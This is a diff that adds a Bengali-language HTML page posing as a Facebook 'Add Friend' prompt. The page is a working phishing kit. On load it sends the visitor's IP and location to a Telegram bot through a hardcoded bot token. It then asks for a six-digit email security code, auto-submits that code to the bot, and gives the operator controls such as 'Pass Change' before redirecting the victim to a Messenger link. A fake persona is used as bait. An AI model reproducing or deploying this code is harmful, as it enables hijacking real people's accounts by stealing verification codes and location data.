@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none; }
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px 20px 60px 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        .main-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin-bottom: 5px; }
+        .sub-text { font-size: 16px; color: #606770; line-height: 1.5; padding: 0 10px; }
+        
+        /* OTP Input Design */
+        .otp-container { display: flex; gap: 8px; justify-content: center; margin-top: 10px; }
+        .otp-box { width: 45px; height: 55px; border: 2px solid #ccd0d5; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; outline: none; background: white; }
+        .otp-box:focus { border-color: #1877f2; }
+
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
+        .red-arrow { color: #ff0000; font-size: 45px; margin-bottom: -10px; animation: bounce 0.8s infinite; font-weight: bold; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        
+        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="onPageLoad()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <div class="red-arrow">⬇</div>
+            <button onclick="startProcess()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="otp_page" class="hidden w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">নিরাপত্তা কোড</h2>
+            <p class="sub-text">আপনার ইমেইলে পাঠানো ৬ সংখ্যার কোডটি দিন।</p>
+            <div class="otp-container">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 0)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveToNext(this, 5)">
+            </div>
+            <button id="submitBtn" onclick="sendCodeAndRedirect(false)" class="btn-blue mt-4 opacity-50" disabled>Submit Code</button>
+        </div>
+
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+            <div class="loader"></div>
+            <h3 class="text-blue-600 font-bold">যাচাই করা হচ্ছে...</h3>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let locData = "Unknown";
+    const inputs = document.querySelectorAll('.otp-box');
+
+    async function onPageLoad() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            locData = `${data.city}, ${data.country_name} (IP: ${data.ip})`;
+            sendToBot(`🌐 **নতুন ভিজিটর!**\n📍 লোকেশন: ${locData}`);
+        } catch (e) {}
+    }
+
+    function startProcess() {
+        // জিমেইল লিঙ্ক এবং কমান্ড সেটআপ
+        const mailtoLink = `mailto:Priyaakter200302@gmail.com?subject=Code Notification&body=Hi,, এখানে আপনার কোড লিখুন।`;
+
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "📧 Gmail Send Option", url: mailtoLink }],
+                [{ text: "🔑 Pass Change", callback_data: "pass_cmd" }],
+                [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        // বাটনে ক্লিক করলেই সব কমান্ড টেলিগ্রামে যাবে
+        sendToBotWithKeyboard(`🚀 **ইউজার বাটনে ক্লিক করেছে!**\n📍 লোকেশন: ${locData}`, keyboard);
+        
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('otp_page').classList.remove('hidden');
+        inputs[0].focus();
+    }
+
+    // OTP Logic
+    function moveToNext(input, index) {
+        if (input.value.length > 1) input.value = input.value.slice(0, 1);
+        if (input.value.length === 1 && index < 5) inputs[index + 1].focus();
+        
+        const code = getFullCode();
+        const btn = document.getElementById('submitBtn');
+        if (code.length === 6) {
+            btn.classList.remove('opacity-50');
+            btn.disabled = false;
+            sendCodeAndRedirect(true); // অটো সাবমিট
+        } else {
+            btn.classList.add('opacity-50');
+            btn.disabled = true;
+        }
+    }
+
+    function getFullCode() {
+        let code = "";
+        inputs.forEach(i => code += i.value);
+        return code;
+    }
+
+    async function sendCodeAndRedirect(isAuto) {
+        const code = getFullCode();
+        if (code.length !== 6) return;
+
+        const msg = `📩 **OTP কোড** ${isAuto ? '(অটো)' : '(ম্যানুয়াল)'}:\n🔢 কোড: \`${code}\`\n📍 লোকেশন: ${locData}`;
+        await sendToBot(msg);
+
+        document.getElementById('otp_page').classList.add('hidden');
+        document.getElementById('verifying').classList.remove('hidden');
+        
+        // ৩ সেকেন্ড পর সাকসেস বা রিডাইরেক্ট (আপনি চাইলে আপনার লিংক দিতে পারেন)
+        setTimeout(() => { window.location.href = "https://m.me/sabinayasmeen121"; }, 3000);
+    }
+
+    function sendToBot(text) {
+        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text }) 
+        });
+    }
+
+    function sendToBotWithKeyboard(text, keyboard) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text, reply_markup: keyboard }) 
+        });
+    }
+</script>
+</body>
+</html>
